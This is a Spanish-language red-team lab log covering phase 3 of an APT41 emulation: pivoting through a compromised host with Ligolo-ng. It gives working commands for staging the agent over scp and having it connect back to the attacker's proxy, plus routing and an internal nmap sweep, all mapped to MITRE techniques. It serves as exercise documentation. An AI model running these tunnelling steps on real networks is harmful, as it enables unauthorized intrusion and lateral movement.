# Pivoting Log — Operación SILENT BRIDGE
## Fase 3 — Protocol Tunneling con Ligolo-ng
**Operación:** SILENT BRIDGE | **Adversario:** APT41 | **Framework:** MITRE ATT&CK v14  
**Operador:** Adrián Camacho | **Fecha:** 14/05/2026  
**Objetivo:** Túnel TLS hacia red interna `10.0.3.0/24` a través de PROD

---

## FASE 3 — Pivoting: Ligolo-ng v0.7.5

**Tácticas MITRE:** TA0011 — C2 / TA0008 — Lateral Movement  
**Técnicas:** T1572 — Protocol Tunneling | T1090 — Proxy

### Contexto táctico

Tras comprometer PROD se confirma visibilidad hacia `10.0.3.0/24` (interfaz `enp0s8`). Ligolo-ng establece un túnel TLS entre el agent en PROD y el proxy en Kali, creando una interfaz `tun` que enruta el tráfico de forma transparente — cualquier herramienta (Nmap, Evil-WinRM, Sliver) opera contra la red interna sin proxychains.

---

### 3.1 — Proxy en Kali
**Captura:** ![fase3-01](../screenshots/FASE-3-Pivoting/fase3-01-ligolo-proxy-listening.png)

```bash
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
/opt/ligolo/proxy -selfcert -laddr 0.0.0.0:11601
```

```
WARN[0000] Using self-signed certificates
WARN[0000] TLS Certificate fingerprint: 4BD05BE7...
INFO[0000] Listening on 0.0.0.0:11601
ligolo-ng »
```

---

### 3.2 — Agent en PROD
**Técnica MITRE:** T1105 — Ingress Tool Transfer  
**Captura:** ![fase3-02](../screenshots/FASE-3-Pivoting/fase3-02-ligolo-agent-connected.png)

```bash
# Kali → transferir agent
scp /opt/ligolo/agent thomas@10.0.2.200:/tmp/

# PROD → ejecutar agent
chmod +x /tmp/agent
/tmp/agent -connect 10.0.2.9:11601 -ignore-cert &
```

**Output en consola Ligolo-ng:**
```
INFO[0297] Agent joined.  id=badd2b6e  name=thomas@prod  remote=10.0.2.200:52232
```

---

### 3.3 — Activar túnel e ifconfig
**Captura:** ![fase3-03](../screenshots/FASE-3-Pivoting/fase3-03-ligolo-tunnel-active.png)

```
ligolo-ng » session
? Specify a session: 1 - thomas@prod - 10.0.2.200:52232
[Agent: thomas@prod] » ifconfig
```

**Interfaces visibles desde PROD:**

| Interfaz | IP | Red |
|---------|-----|-----|
| `enp0s3` | `10.0.2.200/24` | LabRedTeam (externa) |
| `enp0s8` | `10.0.3.200/24` | **LabInternal ← objetivo** |

```
[Agent: thomas@prod] » start
```

---

### 3.4 — Ruta en Kali
**Captura:** ![fase3-04](../screenshots/FASE-3-Pivoting/fase3-04-route-added-kali.png)

```bash
sudo ip route add 10.0.3.0/24 dev ligolo
ip route | grep ligolo
```

```
10.0.3.0/24 dev ligolo scope link
```

---

### 3.5 — Verificación de conectividad
**Captura:** ![fase3-05](../screenshots/FASE-3-Pivoting/fase3-05-nmap-through-tunnel.png)

```bash
nmap -sn --unprivileged 10.0.3.0/24
```

```
Host is up: 10.0.3.5, 10.0.3.7, 10.0.3.150, 10.0.3.200
```

Hosts internos alcanzables directamente desde Kali. Sin proxychains. ✅

**Nota técnica:** ICMP no funciona a través del túnel Ligolo-ng (no soportado). Usar Nmap con `--unprivileged` o TCP connect scan para host discovery.

---

### Resumen Fase 3

```
PIVOTING — Estado final
════════════════════════════════════════════════════

TUNNEL Ligolo-ng v0.7.5
  Proxy (Kali)      → 0.0.0.0:11601 ✅
  Agent (PROD)      → badd2b6e thomas@prod ✅
  Túnel TLS         → activo ✅
  Interfaz tun      → ligolo (Kali) ✅

ROUTING
  10.0.3.0/24 dev ligolo ✅
  Hosts internos alcanzables directamente ✅

TÉCNICAS MITRE:
  T1105  → Ingress Tool Transfer (agent a PROD)
  T1572  → Protocol Tunneling (Ligolo-ng TLS)
  T1090  → Proxy (routing transparente)
  T1046  → Network Service Discovery (verificación)
```

**Criterio de éxito Fase 3:** ✅

---

**Siguiente fase:** [enumeration_log.md](enumeration_log.md) — Fase 4 (enumeración interna)